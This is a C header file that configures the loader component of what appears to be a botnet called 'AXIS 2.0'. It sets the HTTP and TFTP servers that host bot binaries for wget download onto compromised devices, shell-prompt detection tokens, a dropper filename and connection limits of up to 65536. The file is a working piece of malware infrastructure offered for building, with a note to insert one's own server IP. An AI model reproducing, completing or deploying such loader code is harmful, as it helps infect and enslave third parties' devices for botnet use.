#ifndef _LOADER_CONFIG_H
#define _LOADER_CONFIG_H

/* ============================================================================
 * AXIS 2.0 Loader Configuration
 * ============================================================================
 * CRITICAL: Change 0.0.0.0 to your server IP before building!
 * 
 * HTTP Server: Hosts bot binaries for wget download
 * TFTP Server: Alternative binary transfer method
 * Tokens: Login prompt detection strings
 * ============================================================================ */
#define HTTP_SERVER "0.0.0.0"
#define HTTP_PORT 80
#define TFTP_SERVER "0.0.0.0"
#define TFTP_PORT 69

/* Connection limits */
#define MAX_CONNECTIONS 65536
#define MAX_WORKERS 8

/* Tokens and paths */
#define TOKEN_QUERY "shell"
#define TOKEN_RESPONSE "#"
#define FN_DROPPER "sikeriz"
#define FN_BINARY ".06"

#endif
